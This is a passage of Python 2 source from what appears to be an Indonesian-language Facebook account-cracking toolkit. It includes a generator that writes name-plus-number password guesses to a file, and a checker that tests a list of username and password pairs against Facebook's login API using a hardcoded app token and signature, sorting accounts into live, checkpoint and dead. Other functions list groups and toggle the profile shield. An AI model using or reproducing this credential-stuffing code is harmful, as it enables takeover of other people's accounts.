j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')
            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')
            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')
            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')
            file.close()
            time.sleep(1.5)
            print '\n\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSimpan \x1b[0m: \x1b[0m %s.txt' % a
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            lain()
        except IOError as e:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGagal membuat')
            raw_input('\n\x1b[0m[ \x1b[93;3mKembali \x1b[0m]')
            other()

def check_account():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        print ('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mBerkas Konten\x1b[77;1m : \x1b[0mpengguna | sandi')
        print
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mBerkas \x1b[77;1m:\x1b[0m ')
            list = open(file, 'r').readlines()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerkas tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            other()
    pemisah = raw_input('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mPemisah \x1b[77;1m:\x1b[0m ')
    write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
    print
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[0m[\x1b[77;1mSekarang\x1b[0m] \x1b[77;1m' + username + ' | ' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[0m[\x1b[77;1mMengecek\x1b[0m]\x1b[77;1m' + username + ' | ' + password
        else:
            die.append(password)
            print '\x1b[0m[\x1b[77;1mMati\x1b[0m]  \x1b[77;1m' + username + ' | ' + password

    print '\n\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mJumlah\x1b[0m : \x1b[77;1mSekarang=\x1b[0m' + str(len(live)) + ' \x1b[77;1mMengecek=\x1b[0m' + str(len(cek)) + ' \x1b[77;1mMati=\x1b[0m' + str(len(die))
    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
    other()

def grupme():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak tersedia')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
        print
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama  \x1b[0m:\x1b[77;1m ' + str(nama)
                print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mID    \x1b[0m:\x1b[77;1m ' + str(id)
                print
            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mJumlah Group \x1b[0m %s' % len(listgrup)
            print ('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSimpan \x1b[77;1m: \x1b[0mgrupid.txt')
            f.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            other()
        except (KeyboardInterrupt, EOFError):
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            other()
        except KeyError:
            os.remove('grupid.txt')
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGrup tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            lain()
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGagal membuat berkas')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            other()

def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mAktifkan')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mNonaktifkan')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mKembali')
    print
    grd = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if grd == '01' or grd == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if grd == '02' or grd == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if grd == '00' or grd == '0':
                other()
            else:
                if grd == '':
                    print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
                    grd()
                else:
                    print ('\x1b[0m[\x1b[91;1m!\x1b[0m] Tidak ditemukan')
                    exit()

def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']

def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        print ('\x1b[0m[\x1b[94;1m\xe2\x9c\x93\x1b[0m] \x1b[77;1mAktif')
        raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
        other()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            os.system('reset')
            print
            print logo
            print
            print ('\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[77;1mNonaktif')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            other()
        else:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGagal')
            exit()

if __name__ == '__main__':
        login()
